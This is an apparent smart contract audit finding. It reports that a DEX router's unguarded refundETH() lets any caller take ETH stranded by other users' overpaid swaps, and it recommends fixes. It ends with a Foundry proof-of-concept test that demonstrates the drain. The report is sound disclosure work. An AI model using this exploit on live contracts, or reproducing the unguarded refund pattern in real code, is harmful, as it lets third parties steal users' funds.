Audit Report

## Title
Unguarded `refundETH` allows any caller to steal ETH stranded in the router by other users — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`PeripheryPayments.refundETH()` sends the entire native ETH balance of the contract to `msg.sender` with no access control. All payable swap entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, `multicall`) accept `msg.value`, and `pay()` wraps only the exact required amount, leaving any excess ETH in the contract. An attacker can call `refundETH()` in a subsequent transaction to drain all stranded ETH deposited by other users.

## Finding Description
All swap functions in `MetricOmmSimpleRouter` are `payable`:
- `exactInputSingle` (L67), `exactInput` (L92), `exactOutputSingle` (L130), `exactOutput` (L154), `multicall` (L39)

When `tokenIn == WETH` and the contract holds native ETH, `pay()` wraps exactly `value` and leaves the remainder:

```solidity
// PeripheryPayments.sol L75-77
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
```

The excess ETH persists after the transaction. `refundETH()` then unconditionally transfers the full balance to `msg.sender`:

```solidity
// PeripheryPayments.sol L58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

The `receive()` guard at L32-34 only blocks plain ETH transfers (`msg.sender != WETH` reverts), but does **not** block `msg.value` attached to payable function calls. An attacker monitoring the chain can call `refundETH()` in a separate transaction — or front-run the victim's own refund call — to drain all stranded ETH.

## Impact Explanation
Direct loss of user principal. Any ETH sent as `msg.value` in excess of the swap's actual WETH requirement is permanently claimable by an arbitrary third party. The loss is bounded only by the excess ETH the victim sent. This meets the Sherlock threshold for a Medium/High direct loss of user funds.

## Likelihood Explanation
Medium. The intended usage pattern (documented in `IMetricOmmPoolLiquidityAdder.sol` L16-17) is to bundle the swap with `refundETH` in a single `multicall`. However, users who call payable swap functions directly with a rounded-up `msg.value` — a natural pattern when the exact WETH cost is unknown — will strand ETH. A bot watching for non-zero ETH balances on the router can reliably exploit this in a subsequent transaction.

## Recommendation
Track per-caller ETH deposits in transient storage and restrict `refundETH` to only allow each caller to reclaim their own contribution. Alternatively, add a reentrancy-style guard that reverts if `refundETH` is called outside an active `multicall` context. At minimum, document prominently that calling payable swap functions directly with excess `msg.value` will result in permanent loss.

## Proof of Concept
```solidity
function test_attacker_steals_stranded_eth() public {
    address userA    = makeAddr("userA");
    address attacker = makeAddr("attacker");
    vm.deal(userA, 2 ether);

    // userA calls exactInputSingle directly with 2 ether but only 1 ether is consumed
    vm.prank(userA);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,   // only 1 ether used; 1 ether stranded
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    assertEq(address(router).balance, 1 ether, "1 ether stranded");

    // attacker claims it in a separate transaction
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, 1 ether, "attacker stole userA's ETH");
    assertEq(address(router).balance, 0);
}
```
